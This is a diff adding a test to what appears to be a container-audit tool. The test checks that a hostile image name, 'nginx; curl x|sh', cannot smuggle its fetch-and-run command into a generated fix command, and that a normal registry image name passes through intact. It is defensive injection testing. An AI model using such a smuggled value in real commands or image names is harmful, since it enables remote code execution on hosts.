@@ -327,3 +327,12 @@ def test_the_answer_block_shows_each_kind_of_serious_finding_before_repeats():
               "despite the firewall", "subject": "web", "entities": ["port:8080/tcp"]}
     block = FF.answer_block([*pkgs, bypass], "")
     assert "CONT-004" in block and "container web" in block and "port:8080/tcp" in block
+
+
+def test_a_hostile_image_name_never_reaches_a_fix_command_line():
+    j = J.judge(inv(ctr("web", image="nginx; curl x|sh", ports=PUBLISHED)), host_addrs=HOST, confirm=lambda p: True)
+    run_fix = j.signals[0]["fix"][0]["text"]
+    assert "curl" not in run_fix and run_fix.rstrip().endswith("IMAGE")
+    j = J.judge(inv(ctr("web", image="registry.example:5000/shop/web:2.1", ports=PUBLISHED)), host_addrs=HOST,
+                confirm=lambda p: True)
+    assert j.signals[0]["fix"][0]["text"].rstrip().endswith("registry.example:5000/shop/web:2.1")
